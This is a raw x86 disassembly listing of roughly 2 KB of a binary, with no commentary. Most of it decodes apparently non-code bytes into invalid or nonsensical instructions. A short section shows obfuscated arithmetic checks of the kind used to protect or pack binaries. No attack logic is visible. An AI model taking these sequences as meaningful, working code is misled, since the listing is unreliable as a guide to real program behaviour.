  41dee6:	and    eax,0xfc26d565
  41deeb:	push   esi
  41deec:	inc    ebp
  41deed:	(bad)  
  41deee:	jb     0x41df3e
  41def0:	les    edi,FWORD PTR [edi+0x70e89a0e]
  41def6:	retf   
  41def7:	hlt    
  41def8:	push   0xe5eaf75a
  41defd:	pop    ecx
  41defe:	leave  
  41deff:	xor    eax,0xdd6b42d5
  41df04:	jg     0x41df2d
  41df06:	sar    DWORD PTR ds:0x9cda60cb,cl
  41df0c:	xchg   ebx,eax
  41df0d:	aam    0x8a
  41df0f:	push   edi
  41df10:	push   edx
  41df11:	mov    ch,0x8c
  41df13:	retf   0x3597
  41df16:	test   BYTE PTR [edx],bl
  41df18:	push   ss
  41df19:	pop    esi
  41df1a:	out    0xdc,al
  41df1c:	add    esi,esi
  41df1e:	dec    ecx
  41df1f:	and    BYTE PTR [eax+0x56],ah
  41df22:	cli    
  41df23:	retf   
  41df24:	fist   DWORD PTR [edi+edx*4-0x70]
  41df28:	or     bh,BYTE PTR [eax+ecx*8+0x4fc7f475]
  41df2f:	mov    ecx,0xd4b1ad29
  41df34:	mov    dh,0xf3
  41df36:	(bad)  
  41df37:	outs   dx,DWORD PTR ds:[esi]
  41df38:	and    al,0x63
  41df3a:	outs   dx,DWORD PTR ds:[esi]
  41df3b:	bound  edi,QWORD PTR [esi]
  41df3d:	icebp  
  41df3e:	data16 icebp 
  41df40:	aas    
  41df41:	test   DWORD PTR [ecx+ecx*1-0x5603fd2d],0x9b00c07d
  41df4c:	push   edx
  41df4d:	jg     0x41df86
  41df4f:	test   DWORD PTR [edi+0x20],esp
  41df52:	int    0x68
  41df54:	test   al,0x19
  41df56:	fdiv   DWORD PTR ds:0x754ee244
  41df5c:	mov    edi,0x5708e887
  41df61:	mov    fs,WORD PTR [edx]
  41df63:	leave  
  41df64:	test   eax,0x19e197b8
  41df69:	sub    BYTE PTR [edi-0x56],ah
  41df6c:	sub    ebx,edx
  41df6e:	int    0xf7
  41df70:	xor    al,0x51
  41df72:	sub    BYTE PTR [ebp+0x3447b763],0x6d
  41df79:	scas   eax,DWORD PTR es:[edi]
  41df7a:	inc    BYTE PTR [ecx+0x5]
  41df7d:	jae    0x41dfcc
  41df7f:	mov    edi,0xf3c95f95
  41df84:	push   esp
  41df85:	xchg   ebp,eax
  41df86:	inc    eax
  41df87:	jg     0x41df7d
  41df89:	jo     0x41dfa1
  41df8b:	in     eax,0x15
  41df8d:	mov    ds:0xbb470ec5,al
  41df92:	cdq    
  41df93:	mov    ah,0xe3
  41df95:	dec    ebp
  41df96:	and    BYTE PTR [eax+0x6ae052ff],ch
  41df9c:	pop    ss
  41df9d:	int    0x3d
  41df9f:	lods   al,BYTE PTR ds:[esi]
  41dfa0:	sti    
  41dfa1:	cmp    DWORD PTR ds:0x113bbb86,edi
  41dfa7:	pop    ebx
  41dfa8:	mov    dl,0x70
  41dfaa:	cmp    al,0x54
  41dfac:	mov    ebp,0x4e8e3478
  41dfb1:	(bad)  
  41dfb2:	sti    
  41dfb3:	in     al,dx
  41dfb4:	and    dh,BYTE PTR [esi]
  41dfb6:	mov    bh,0x2d
  41dfb8:	mov    esp,0x78be4cbc
  41dfbd:	fdiv   st,st(4)
  41dfbf:	xor    ebp,0xffffff91
  41dfc2:	add    eax,0x5904b27e
  41dfc7:	lods   eax,DWORD PTR ds:[esi]
  41dfc8:	retf   
  41dfc9:	mov    esp,0x3771151c
  41dfce:	pop    edi
  41dfcf:	jl     0x41e00d
  41dfd1:	popf   
  41dfd2:	ret    
  41dfd3:	inc    esi
  41dfd4:	fmul   st,st(6)
  41dfd6:	sbb    ch,dh
  41dfd8:	scas   eax,DWORD PTR es:[edi]
  41dfd9:	test   DWORD PTR [eax+0x5ccbb992],edx
  41dfdf:	ror    BYTE PTR [esi+0x7e],0x9f
  41dfe3:	ja     0x41e000
  41dfe5:	add    BYTE PTR [edx],bl
  41dfe7:	test   BYTE PTR ds:0x1ceef3b2,dh
  41dfed:	add    eax,0x15d20746
  41dff2:	push   0xffffffbc
  41dff4:	inc    edi
  41dff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dff6:	dec    edi
  41dff7:	sbb    al,0xc
  41dff9:	scas   al,BYTE PTR es:[edi]
  41dffa:	or     DWORD PTR [ebx+0x46],ecx
  41dffd:	outs   dx,BYTE PTR ds:[esi]
  41dffe:	out    0x5f,eax
  41e000:	mov    edx,0xfe392a9d
  41e005:	adc    al,0x42
  41e007:	push   esi
  41e008:	sbb    al,0xca
  41e00a:	jnp    0x41dfda
  41e00c:	cdq    
  41e00d:	or     DWORD PTR ds:0xf91105b6,esp
  41e013:	fild   DWORD PTR ds:0x95654f5d
  41e019:	lahf   
  41e01a:	jne    0x41e04b
  41e01c:	outs   dx,BYTE PTR ds:[esi]
  41e01d:	or     bl,dl
  41e01f:	shr    BYTE PTR ds:0xf91a805f,cl
  41e025:	fmul   DWORD PTR [eax+0x3196f9ee]
  41e02b:	push   ebx
  41e02c:	cdq    
  41e02d:	xchg   esi,eax
  41e02e:	add    al,0xe6
  41e030:	dec    ebp
  41e031:	sub    al,0x6e
  41e033:	mov    ds:0x6b9d7b4c,al
  41e038:	sbb    DWORD PTR [edx+0x74ac9d14],ebx
  41e03e:	dec    eax
  41e03f:	push   edx
  41e040:	das    
  41e041:	add    ecx,DWORD PTR [ecx+0x23ac310b]
  41e047:	outs   dx,DWORD PTR ds:[esi]
  41e048:	ds mov dh,0x98
  41e04b:	sbb    al,BYTE PTR [edx]
  41e04d:	leave  
  41e04e:	lock xor edx,DWORD PTR [esi]
  41e051:	mov    bh,ch
  41e053:	mov    edi,0x2653b7a8
  41e058:	push   esp
  41e059:	sub    bh,BYTE PTR [edx+0x19738cbb]
  41e05f:	stos   DWORD PTR es:[edi],eax
  41e060:	out    0xb4,eax
  41e062:	push   cs
  41e063:	adc    al,dl
  41e065:	outs   dx,BYTE PTR ds:[esi]
  41e066:	dec    eax
  41e067:	loopne 0x41e000
  41e069:	push   0xb3bd4eee
  41e06e:	jmp    0x6c0c:0xf13458c3
  41e075:	inc    ebp
  41e076:	mov    al,ds:0x2ba3b714
  41e07b:	mov    dh,0x17
  41e07d:	mov    eax,0xfc06f5cc
  41e082:	and    dh,BYTE PTR [ecx-0x5aa22144]
  41e088:	pop    edx
  41e089:	retf   
  41e08a:	int    0x63
  41e08c:	ins    BYTE PTR es:[edi],dx
  41e08d:	aas    
  41e08e:	addr16 pop ecx
  41e090:	test   BYTE PTR [ecx+0x50ce15af],bl
  41e096:	and    eax,0xab0a3607
  41e09b:	es call 0xcba:0xda19e76c
  41e0a3:	cli    
  41e0a4:	pop    ss
  41e0a5:	retf   0xa83f
  41e0a8:	push   0xffffff93
  41e0aa:	aaa    
  41e0ab:	jge    0x41e0c7
  41e0ad:	dec    ebx
  41e0ae:	call   0x9e2c660
  41e0b3:	sbb    DWORD PTR [ebp+0x4c],edx
  41e0b6:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e0b8:	pop    ebx
  41e0b9:	push   ss
  41e0ba:	fdivrp st(4),st
  41e0bc:	aad    0xc4
  41e0be:	xchg   DWORD PTR [edx-0x476ab064],esi
  41e0c4:	imul   esi,DWORD PTR [esi+edx*1-0xdcb3b26],0xa9278925
  41e0cf:	mov    eax,ds:0x64929799
  41e0d4:	sub    DWORD PTR [edi],ecx
  41e0d6:	ret    
  41e0d7:	out    0x72,al
  41e0d9:	mov    eax,ds:0x24113baa
  41e0de:	call   0x37c6c13
  41e0e3:	inc    edi
  41e0e4:	jnp    0x41e094
  41e0e6:	adc    eax,0x9af429d2
  41e0eb:	shl    BYTE PTR [eax],1
  41e0ed:	sar    bl,cl
  41e0ef:	lock add edx,esi
  41e0f2:	stos   DWORD PTR es:[edi],eax
  41e0f3:	outs   dx,BYTE PTR ds:[esi]
  41e0f4:	sub    cl,dl
  41e0f6:	jl     0x41e157
  41e0f8:	cmp    edx,DWORD PTR [ecx+0x7dcc755f]
  41e0fe:	data16 loope 0x41e0ae
  41e101:	push   es
  41e102:	and    al,0xd9
  41e104:	ds dec edi
  41e106:	adc    al,0x6a
  41e108:	imul   esi
  41e10a:	scas   eax,DWORD PTR es:[edi]
  41e10b:	push   esp
  41e10c:	(bad)  
  41e10d:	int3   
  41e10e:	jnp    0x41e188
  41e110:	dec    ebx
  41e111:	loopne 0x41e097
  41e113:	cmp    ah,dl
  41e115:	arpl   WORD PTR [ebp+0x2444c71f],cx
  41e11b:	adc    BYTE PTR [edx],bl
  41e11d:	inc    edx
  41e11e:	add    BYTE PTR [eax],al
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	stos   DWORD PTR es:[di],eax
  41e1f3:	or     BYTE PTR [edx-0x3a],ch
  41e1f6:	aas    
  41e1f7:	push   ss
  41e1f8:	sbb    BYTE PTR [edx+edx*1-0x6c79e7e8],bh
  41e1ff:	int    0x28
  41e201:	clc    
  41e202:	push   edi
  41e203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e204:	jmp    0xf474:0x67b83d94
  41e20b:	sbb    BYTE PTR [ecx-0x5],al
  41e20e:	(bad)  
  41e20f:	stos   BYTE PTR es:[edi],al
  41e210:	stos   BYTE PTR es:[edi],al
  41e211:	xchg   DWORD PTR [esi],esi
  41e213:	mov    esp,DWORD PTR [edi+eax*8-0x28cd587e]
  41e21a:	leave  
  41e21b:	jae    0x41e1aa
  41e21d:	sahf   
  41e21e:	mov    dl,0x18
  41e220:	in     eax,dx
  41e221:	adc    ebp,edx
  41e223:	popa   
  41e224:	aam    0x52
  41e226:	cmp    al,dh
  41e228:	ret    
  41e229:	(bad)  
  41e22a:	mov    edx,0xf8f6061f
  41e22f:	lahf   
  41e230:	je     0x41e1c1
  41e232:	ss inc edi
  41e234:	mov    ebx,0x92d2f48e
  41e239:	mov    edi,es
  41e23b:	fbstp  TBYTE PTR [edi+edx*4+0x4878774f]
  41e242:	pop    edi
  41e243:	(bad)
  41e247:	daa    
  41e248:	sbb    BYTE PTR [edx],0x78
  41e24b:	imul   ebx,DWORD PTR [ebp+0x27eefae2],0x8
  41e252:	(bad)  
  41e253:	sub    DWORD PTR [ebx+0x5c],eax
  41e256:	jp     0x41e293
  41e258:	fs adc eax,0x241f0559
  41e25e:	pushf  
  41e25f:	ror    BYTE PTR ds:0x2e87640b,cl
  41e265:	mov    ds:0x3b7a7066,al
  41e26a:	bound  edx,QWORD PTR [edi-0x64]
  41e26d:	xchg   esp,eax
  41e26e:	(bad)
  41e272:	fcomp  st(1)
  41e274:	stc    
  41e275:	pop    esp
  41e276:	mov    eax,ds:0xfc0697e4
  41e27b:	fst    st(7)
  41e27d:	es (bad) 
  41e27f:	jmp    FWORD PTR [edi+edi*4-0x3de5cb4e]
  41e286:	mov    ah,0x6d
  41e288:	(bad)  
  41e289:	ds mov ebp,edx
  41e28c:	and    DWORD PTR [edx+0x38c33d1a],ebp
  41e292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e293:	in     al,dx
  41e294:	ins    DWORD PTR es:[edi],dx
  41e295:	jo     0x41e245
  41e297:	xor    esp,esi
  41e299:	test   al,0x23
  41e29b:	int3   
  41e29c:	hlt    
  41e29d:	mov    bl,0xf2
  41e29f:	lea    ebp,[ebx]
  41e2a1:	loope  0x41e27d
  41e2a3:	popf   
  41e2a4:	ss ffreep st(0)
  41e2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2a8:	clc    
  41e2a9:	jge    0x41e310
  41e2ab:	and    DWORD PTR [esi],edx
  41e2ad:	and    al,0x85
  41e2af:	sahf   
  41e2b0:	daa    
  41e2b1:	xchg   esi,eax
  41e2b2:	call   0xee7b:0xb7acef98
  41e2b9:	cmc    
  41e2ba:	div    edx
  41e2bc:	adc    al,0x70
  41e2be:	xchg   edx,eax
  41e2bf:	ret    
  41e2c0:	add    DWORD PTR [eax],0xd5421b47
  41e2c6:	mov    dh,0xed
  41e2c8:	xchg   ebp,eax
  41e2c9:	cmc    
  41e2ca:	enter  0xdda,0x28
  41e2ce:	pop    edi
  41e2cf:	xor    ch,BYTE PTR [edx+0x5db72599]
  41e2d5:	inc    esi
  41e2d6:	cmp    DWORD PTR [esi+esi*1-0x4b],edi
  41e2da:	cs ins BYTE PTR es:[edi],dx
  41e2dc:	push   ss
  41e2dd:	(bad)  
  41e2de:	imul   ebp,DWORD PTR [esi+0x14],0x1fb15d19
  41e2e5:	cld    
  41e2e6:	dec    edi
  41e2e7:	xor    BYTE PTR [edx-0x89229fd],ch
  41e2ed:	and    BYTE PTR [ecx],al
  41e2ef:	sub    eax,0x63c9d2c4
  41e2f4:	cmp    dl,BYTE PTR [ebx]
  41e2f6:	mov    dh,BYTE PTR [ebp-0x3be73c32]
  41e2fc:	popf   
  41e2fd:	stos   BYTE PTR es:[edi],al
  41e2fe:	jbe    0x41e2b6
  41e300:	inc    ebp
  41e301:	xchg   DWORD PTR [edx],esp
  41e303:	cmp    esi,esp
  41e305:	xchg   edx,eax
  41e306:	mov    edi,0xc9238657
  41e30b:	iret   
  41e30c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e30d:	xor    BYTE PTR [ebp-0x241910fb],cl
  41e313:	std    
  41e314:	arpl   WORD PTR [edi-0x7c1c8680],ax
  41e31a:	mov    bh,0xad
  41e31c:	xor    al,0x99
  41e31e:	adc    DWORD PTR [ecx-0x512f509a],0x58ecb087
  41e328:	sbb    BYTE PTR [ebx],dh
  41e32a:	mov    cl,0x30
  41e32c:	push   0x16
  41e32e:	xor    BYTE PTR [edx+0x5ad1c2e8],ch
  41e334:	rol    DWORD PTR [esi+0x43],0xbe
  41e338:	jo     0x41e31b
  41e33a:	dec    eax
  41e33b:	rol    DWORD PTR ds:0xf95bc125,0xc7
  41e342:	test   eax,0xff9e3a3a
  41e347:	int    0x4f
  41e349:	xchg   edx,eax
  41e34a:	xchg   BYTE PTR [ebp+0x765557b8],cl
  41e350:	mov    ecx,0x5b3b2784
  41e355:	push   0x2ce8c245
  41e35a:	push   ebp
  41e35b:	mov    dl,0x67
  41e35d:	xor    bh,bh
  41e35f:	imul   ebp,DWORD PTR [edi],0x110c3490
  41e365:	js     0x41e3cb
  41e367:	mov    cl,0xc5
  41e369:	sahf   
  41e36a:	dec    esi
  41e36b:	cld    
  41e36c:	in     eax,0x19
  41e36e:	add    eax,0x37ad73c7
  41e373:	pop    es
  41e374:	mov    eax,ecx
  41e376:	adc    eax,0x24606a35
  41e37b:	xchg   esp,eax
  41e37c:	jmp    0xec038e73
  41e381:	aam    0x1e
  41e383:	sub    ah,BYTE PTR [eax-0x59]
  41e386:	sub    al,0x35
  41e388:	retf   0x9af
  41e38b:	cmp    BYTE PTR [ecx-0x4bc35735],dl
  41e391:	out    dx,eax
  41e392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e393:	daa    
  41e394:	std    
  41e395:	cmp    esi,ebp
  41e397:	les    ecx,FWORD PTR [edx-0x15]
  41e39a:	popf   
  41e39b:	and    al,0x3
  41e39d:	mov    ah,0xe6
  41e39f:	int    0xa8
  41e3a1:	sbb    BYTE PTR [ecx],0x8b
  41e3a4:	or     al,bl
  41e3a6:	xchg   ebx,ebx
  41e3a8:	inc    edi
  41e3a9:	outs   dx,DWORD PTR ds:[esi]
  41e3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3ab:	jmp    0x41e348
  41e3ad:	test   ecx,edi
  41e3af:	les    ecx,FWORD PTR [esi]
  41e3b1:	out    dx,al
  41e3b2:	cli    
  41e3b3:	(bad)  
  41e3b4:	push   0xffffff8c
  41e3b6:	push   ss
  41e3b7:	sbb    al,0xb4
  41e3b9:	jo     0x41e420
  41e3bb:	cmp    DWORD PTR [eax-0x436e5eb2],ecx
  41e3c1:	test   al,0x61
  41e3c3:	xor    al,0xc6
  41e3c5:	and    al,0x94
  41e3c7:	push   ecx
  41e3c8:	adc    ah,bl
  41e3ca:	repnz push 0x13986e44
  41e3d0:	lock cmp cl,BYTE PTR [esi+eiz*2+0x3e]
  41e3d5:	lods   al,BYTE PTR ds:[esi]
  41e3d6:	push   0x2158105f
  41e3db:	loopne 0x41e3ab
  41e3dd:	test   BYTE PTR [ebx-0x643fa6f2],bl
  41e3e3:	inc    esi
  41e3e4:	popa   
  41e3e5:	test   eax,0x4097070d
  41e3ea:	fdivr  DWORD PTR [edi+0x3dc1edf4]
  41e3f0:	xor    dl,BYTE PTR [edi+0x61]
  41e3f3:	(bad)  
  41e3f4:	cli    
  41e3f5:	adc    BYTE PTR [ecx-0x1d005fcc],ch
  41e3fb:	cld    
  41e3fc:	mov    edx,0x1a45604d
  41e401:	inc    eax
  41e402:	push   edi
  41e403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e404:	fwait
  41e405:	sub    edi,DWORD PTR [ecx]
  41e407:	cmp    BYTE PTR [edx-0x2f53ab6a],cl
  41e40d:	test   al,0x7c
  41e40f:	and    edi,DWORD PTR [ebx+0x62bf6781]
  41e415:	jb     0x41e471
  41e417:	or     eax,0x16da9016
  41e41c:	xchg   esp,eax
  41e41d:	repz or eax,0xcbb2d8b7
  41e423:	mov    edx,0xd73a5943
  41e428:	ss shl esi,cl
  41e42b:	sbb    al,0x2a
  41e42d:	jmp    0x2a9fe8fd
  41e432:	out    dx,al
  41e433:	mov    ebp,0xb5397ed8
  41e438:	lahf   
  41e439:	sbb    al,0x67
  41e43b:	xchg   edi,eax
  41e43c:	les    esp,FWORD PTR [esi+0x3b3030fd]
  41e442:	stos   BYTE PTR es:[edi],al
  41e443:	clc    
  41e444:	xor    DWORD PTR [ebx],0x5a
  41e447:	rol    BYTE PTR [eax-0x331b99e4],cl
  41e44d:	pop    eax
  41e44e:	xchg   BYTE PTR es:[ebp-0x45f11331],bl
  41e455:	and    al,0x93
  41e457:	rcl    bl,0x6b
  41e45a:	or     BYTE PTR [esi-0x23],dh
  41e45d:	mov    edi,0xb2656008
  41e462:	adc    BYTE PTR [ebx],bl
  41e464:	ja     0x41e4ae
  41e466:	and    DWORD PTR [ecx],ecx
  41e468:	sub    ebp,DWORD PTR [esi]
  41e46a:	call   eax
  41e46c:	int3   
  41e46d:	pop    ss
  41e46e:	lods   eax,DWORD PTR ds:[esi]
  41e46f:	test   BYTE PTR [ecx],bh
  41e471:	shl    DWORD PTR [edi],0x3d
  41e474:	or     DWORD PTR [edi+ebx*8],esp
  41e477:	mov    ebx,0x74ec2c10
  41e47c:	bound  ebx,QWORD PTR [edi-0x4ab5cca8]
  41e482:	pop    ecx
  41e483:	dec    ebp
  41e484:	loope  0x41e4f6
  41e486:	xor    BYTE PTR [esi-0x70],al
  41e489:	test   DWORD PTR [eax],ebp
  41e48b:	stc    
  41e48c:	lahf   
  41e48d:	aas    
  41e48e:	xchg   BYTE PTR [eax],ah
  41e490:	push   edx
  41e491:	fwait
  41e492:	and    DWORD PTR [ecx+0x65],esi
  41e495:	and    al,0xd
  41e497:	mov    ah,0xdc
  41e499:	cmovnp ecx,esp
  41e49c:	push   esp
  41e49d:	ss in  eax,0x30
  41e4a0:	xlat   BYTE PTR ds:[ebx]
  41e4a1:	jb     0x41e4a9
  41e4a3:	dec    edx
  41e4a4:	test   DWORD PTR [ebx+0x74ec2869],ecx
  41e4aa:	ficomp WORD PTR [ebp+0x4d]
  41e4ad:	fisttp WORD PTR [edi+0xf]
  41e4b0:	and    cl,BYTE PTR [eax-0x6ae3a901]
  41e4b6:	adc    edx,edi
  41e4b8:	out    0x4b,al
  41e4ba:	loop   0x41e51d
  41e4bc:	jne    0x41e43e
  41e4be:	fwait
  41e4bf:	mov    bx,0x8254
  41e4c3:	dec    edx
  41e4c4:	mov    ebp,0xfc8ba9c
  41e4c9:	xor    ecx,0x3e041f4a
  41e4cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4d0:	cmp    DWORD PTR [edx],esi
  41e4d2:	cld    
  41e4d3:	pop    ss
  41e4d4:	dec    ebx
  41e4d5:	popa   
  41e4d6:	call   0x57e8:0x91b09699
  41e4dd:	fisub  DWORD PTR [esi]
  41e4df:	mov    dl,BYTE PTR [ecx]
  41e4e1:	mov    ss,WORD PTR [ecx]
  41e4e3:	add    edx,DWORD PTR [ecx]
  41e4e5:	int    0xe0
  41e4e7:	pop    ecx
  41e4e8:	and    BYTE PTR [edx-0x39d88058],dl
  41e4ee:	imul   esi,DWORD PTR [eax-0x77],0x61ea368a
  41e4f5:	lahf   
  41e4f6:	(bad)
  41e4fa:	call   0x32d3:0x4646b8e1
  41e501:	out    dx,al
  41e502:	stos   DWORD PTR es:[edi],eax
  41e503:	lods   eax,DWORD PTR ds:[esi]
  41e504:	pop    ss
  41e505:	jecxz  0x41e511
  41e507:	leave  
  41e508:	out    0x83,al
  41e50a:	mov    dl,0x23
  41e50c:	and    BYTE PTR ds:0x69646acc,ah
  41e512:	pop    ebp
  41e513:	popf   
  41e514:	inc    eax
  41e515:	adc    esp,DWORD PTR [esp+esi*8]
  41e518:	out    dx,eax
  41e519:	push   esp
  41e51a:	jmp    0x342f:0xdf0ade8c
  41e521:	call   0x4a5e:0x2fb86780
  41e528:	in     al,dx
  41e529:	jne    0x41e594
  41e52b:	leave  
  41e52c:	inc    esp
  41e52d:	pop    edx
  41e52e:	sbb    BYTE PTR [ecx+eax*2],cl
  41e531:	mov    edx,0x9caee402
  41e536:	push   esp
  41e537:	retf   
  41e538:	cmp    BYTE PTR [ecx+0x3e],al
  41e53b:	adc    eax,DWORD PTR [ebp-0x654411a5]
  41e541:	push   ss
  41e542:	pushf  
  41e543:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41e545:	pop    ss
  41e546:	fld    TBYTE PTR [edi+0x1bf57758]
  41e54c:	jl     0x41e524
  41e54e:	dec    ebx
  41e54f:	repnz pushf 
  41e551:	lsl    esp,WORD PTR [ecx+0x898359e]
  41e558:	js     0xb6d33a56
  41e55e:	adc    eax,eax
  41e560:	adc    DWORD PTR [edx-0x483b0e0f],eax
  41e566:	ds mov ebx,0x89418d37
  41e56c:	shl    ah,0x83
  41e56f:	push   eax
  41e570:	rcr    DWORD PTR ds:0xa2887f39,cl
  41e576:	aam    0xa1
  41e578:	sbb    cl,bl
  41e57a:	cmp    al,0xbf
  41e57c:	mov    ds,WORD PTR [edi-0x7634d7e9]
  41e582:	lods   eax,DWORD PTR ds:[esi]
  41e583:	pop    ss
  41e584:	cmp    edi,DWORD PTR [eax+0x21]
  41e587:	retf   0x8048
  41e58a:	shl    DWORD PTR [esp+ebx*8],0xeb
  41e58e:	stos   BYTE PTR es:[edi],al
  41e58f:	pushf  
  41e590:	je     0x41e549
  41e592:	bound  edx,QWORD PTR [ecx+edi*8-0x3f]
  41e596:	mov    al,ds:0x94b28e66
  41e59b:	xor    dh,BYTE PTR [ebx+0xe]
  41e59e:	ins    DWORD PTR es:[edi],dx
  41e59f:	adc    bl,BYTE PTR [eax-0x1c]
  41e5a2:	adc    DWORD PTR [edi],0xffffffe2
  41e5a5:	into   
  41e5a6:	out    0x28,al
  41e5a8:	enter  0x7fcc,0x41
  41e5ac:	(bad)  
  41e5ad:	adc    bl,ch
  41e5af:	shl    eax,0x2
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0xbaae715
  41e5c6:	xor    ebx,DWORD PTR [eax]
  41e5c8:	stos   BYTE PTR es:[edi],al
  41e5c9:	imul   esi,DWORD PTR [edi],0x16
  41e5cc:	sbb    BYTE PTR [edx+edx*1+0x79b81818],bh
  41e5d3:	or     ch,BYTE PTR [ecx]
  41e5d5:	mov    ch,bl
  41e5d7:	scas   eax,DWORD PTR es:[edi]
  41e5d8:	sbb    BYTE PTR [esi-0x4c],al
  41e5db:	sbb    edx,DWORD PTR ds:0x338dce1d
  41e5e1:	sbb    al,BYTE PTR [ecx]
  41e5e3:	outs   dx,BYTE PTR ds:[esi]
  41e5e4:	pop    esp
  41e5e5:	mov    WORD PTR [ebp+edi*4-0x2071c393],?
  41e5ec:	fstp   DWORD PTR [esi-0x39c8c275]
  41e5f2:	mov    bh,al
  41e5f4:	ret    0x64a9
  41e5f7:	mov    eax,ds:0xafabb102
  41e5fc:	in     al,dx
  41e5fd:	push   ebp
  41e5fe:	dec    ecx
  41e5ff:	sbb    DWORD PTR [eax],ebp
  41e601:	fistp  WORD PTR [edi-0x6e]
  41e604:	aaa    
  41e605:	xor    eax,0xdad5e60e
  41e60a:	mov    dh,0x46
  41e60c:	fadd   DWORD PTR [esi+0x72]
  41e60f:	mov    BYTE PTR [edi],dl
  41e611:	in     eax,dx
  41e612:	cmp    ebx,DWORD PTR [ebp+0x1c]
  41e615:	push   0x921a7199
  41e61a:	lea    ecx,[ebp-0x7cc2a05a]
  41e620:	repnz or ch,BYTE PTR [edi]
  41e623:	jge    0x41e679
  41e625:	mov    ah,0x90
  41e627:	cs dec ebp
  41e629:	push   ebp
  41e62a:	pop    ecx
  41e62b:	sbb    DWORD PTR [ebx+0x15],ebx
  41e62e:	les    edi,FWORD PTR ds:0x22971bea
  41e634:	ror    DWORD PTR [ebx-0x6a],1
  41e637:	test   al,0xe1
  41e639:	jle    0x41e5d8
  41e63b:	and    bl,BYTE PTR [edx+0x2da5cf24]
  41e641:	scas   eax,DWORD PTR es:[edi]
  41e642:	fimul  WORD PTR [eax+0x60]
  41e645:	lods   al,BYTE PTR ds:[esi]
  41e646:	fmul   DWORD PTR [edi*8+0x3cfe17e2]
  41e64d:	into   
  41e64e:	add    al,0x3e
  41e650:	arpl   WORD PTR [ecx],bx
  41e652:	sbb    eax,0x3b1703c9
  41e657:	adc    eax,0x3fb8b5e5
  41e65c:	mov    edi,0x46284514
  41e661:	push   es
  41e662:	imul   eax,DWORD PTR [edx-0x760a5913],0xfffffff0
  41e669:	lea    ecx,[esi]
  41e66b:	repnz dec esi
  41e66d:	dec    esi
  41e66e:	mov    esp,0xe5921c5d
  41e673:	jmp    0x41e6dd
  41e675:	and    al,0x16
  41e677:	cmp    dh,BYTE PTR [edi-0x3a8bea9f]
  41e67d:	ja     0x41e61e
  41e67f:	cmp    edx,eax
  41e681:	sti    
  41e682:	pop    edi
  41e683:	and    eax,0x26bf7e0e
  41e688:	lods   al,BYTE PTR ds:[esi]
  41e689:	(bad)  
  41e68a:	push   0xffffff8d
  41e68c:	mov    edx,0xf2ff26bf
  41e691:	mov    ?,WORD PTR [ebx-0x73]
  41e694:	popa   
  41e695:	inc    ebp
  41e696:	mov    dl,0xc3
  41e698:	xor    al,0x79
  41e69a:	(bad)  
  41e69b:	fnstenv [edx+0x78]
  41e69e:	gs pusha 
  41e6a0:	xor    eax,0xeea06a7e
  41e6a5:	mov    al,ds:0xec46e5f9
  41e6aa:	mov    ecx,0xc5a2c110
  41e6af:	ds scas al,BYTE PTR es:[edi]
  41e6b1:	cld    
  41e6b2:	div    ecx
  41e6b4:	test   al,0xeb
  41e6b6:	inc    ebx
  41e6b7:	inc    edx
  41e6b8:	call   0xc7fd0cee
  41e6bd:	and    bh,BYTE PTR [ebp+ebp*2+0x5067cb43]
  41e6c4:	mov    esi,0x810dde5
  41e6c9:	js     0x41e691
